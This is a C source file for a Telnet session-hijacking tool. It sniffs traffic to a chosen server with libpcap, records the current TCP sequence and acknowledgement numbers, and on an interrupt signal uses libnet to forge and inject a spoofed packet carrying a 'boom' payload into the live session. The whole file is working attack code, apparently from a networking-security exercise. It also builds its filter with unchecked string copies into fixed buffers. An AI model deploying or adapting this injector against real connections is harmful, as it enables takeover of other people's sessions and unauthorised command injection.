#include <pcap/pcap.h>
#include <libnet.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "sniffer.h"
#include "analyzer.h"
#include "logger.h"

u_int32_t global_seq = 0;
u_int32_t global_ack = 0;
struct hdrs *global_headers = NULL;
char global_dev_name[100];

pcap_t *global_phandle = NULL;


void SIGINT_handler(int signum) {
	if (global_seq == 0 || 
		global_ack == 0 ||
		global_headers == NULL ||
		global_phandle == NULL) {
		printf("Cannot send BOOM packet at this moment.\n");
		exit(1);
	}

	char errbuf[LIBNET_ERRBUF_SIZE]; 
	libnet_t *l = libnet_init(LIBNET_RAW4, global_dev_name, errbuf);
	if (l == NULL) {
		printf("libnet_init(): %s\n", errbuf);
		exit(1);
	}

	libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
	libnet_ptag_t ipv4_tag = LIBNET_PTAG_INITIALIZER;

	struct tcp_hdr *tcp_header = global_headers->tcp_header;
	struct ip_hdr *ip_header = global_headers->ip_header;

	char payload[] = {'b', 'o', 'o', 'm', '\r', '\n'};

	tcp_tag = libnet_build_tcp(ntohs(tcp_header->tcp_src_port), //source port
			              ntohs(tcp_header->tcp_dst_port), //destination port
			              global_seq, //sequence number
			              global_ack, //acknowledgement number
			              TCP_PUSH | TCP_ACK, //flags
			              1024, //window size
			              0, //checksum
			              0, //urgent pointer
			              20, //TCP packet length
			              payload, //payload pointer
			              6, //payload length
			              l,
			              tcp_tag);

	if (tcp_tag == -1) {
		printf("Can't build TCP header: %s\n", libnet_geterror(l));
		exit(1);
	}

	ipv4_tag = libnet_build_ipv4(46, //IP packet length
								 0, //type of service
								 0, //id
								 0, //fragmentation bits 
								 64, //time to live
								 IPPROTO_TCP, //protocol
								 0, //checksum
								 *(uint32_t *)&(ip_header->ip_src_addr), //source IP address
								 *(uint32_t *)&(ip_header->ip_dst_addr), //destination IP address
								 NULL, //payload poitner
								 0, //payload length
								 l,
								 ipv4_tag);

	if (ipv4_tag == -1) {
		printf("Can't build IPv4 header: %s\n", libnet_geterror(l));
		exit(1);
	}

    if (libnet_write(l) == -1) {
    	printf("Error writing packet: %s\n", libnet_geterror(l));
    	exit(1);
    }

	printf("BOOM Packet sent!\n");

	pcap_close(global_phandle);
	libnet_destroy(l);

	exit(0);
}

int main(int argc, char **argv) {
	char errbuf[PCAP_ERRBUF_SIZE];

	char *dev_name;
	char *server_name;
	char *server_port;
	if (argc == 3) {
		server_name = argv[1];
		server_port = argv[2];
		dev_name = "eth0";
		strcpy(global_dev_name, "eth0");
	} else if (argc == 4) {
		server_name = argv[1];
		server_port = argv[2];
		dev_name = argv[3];
		strcpy(global_dev_name, dev_name);
		if (!device_exists(dev_name)) {
			printf("Device does not exist.\n");
			exit(1);
		}
	} else {
		printf("Usage: hijack-telnet server-name server_port [dev_name]\n");
		exit(1);
	}

	struct sigaction action;
	action.sa_handler = SIGINT_handler;
	if (sigaction(SIGINT, &action, NULL) < 0) {
		perror("SIGINT sigaction");
		exit(1);
	}
	if (sigaction(SIGQUIT, &action, NULL) < 0) {
		perror("SIGQUIT sigaction");
		exit(1);
	}

	pcap_t *phandle = open_phandle(dev_name, errbuf);
	if (phandle == NULL) {
		printf("Error: %s\n", errbuf);
		exit(1);
	}
	global_phandle = phandle;

	char filter_expr[200];
	strcpy(filter_expr, "(src host ");
	strcat(filter_expr, server_name);
	strcat(filter_expr, " and src port ");
	strcat(filter_expr, server_port);
	strcat(filter_expr, ") or (dst host ");
	strcat(filter_expr, server_name);
	strcat(filter_expr, " and dst port ");
	strcat(filter_expr, server_port);
	strcat(filter_expr, ")");
	printf("Filter expression: %s\n", filter_expr);
	apply_filter(phandle, filter_expr);

	struct pcap_pkthdr *header;
	const u_char *pkt_data;

	int res;
    while((res = pcap_next_ex(phandle, &header, &pkt_data)) >= 0){ 
        // 0 means that libpcap's read timeout expired
        if(res == 0)
            continue;

        printf("Packet captured!\n");

        struct hdrs *headers = analyze_packet(pkt_data);
        log_headers(headers);

        global_headers = headers;
        if (headers->tcp_header) {
        	global_seq = ntohl(headers->tcp_header->tcp_seq);
        	global_ack = ntohl(headers->tcp_header->tcp_ack);
        }

        printf("---------------------------------------------\n");
    }

    if (res == -1) {
        printf("An error occurred while reading the packet.\n");
        exit(1);
    } 

	return 0;
}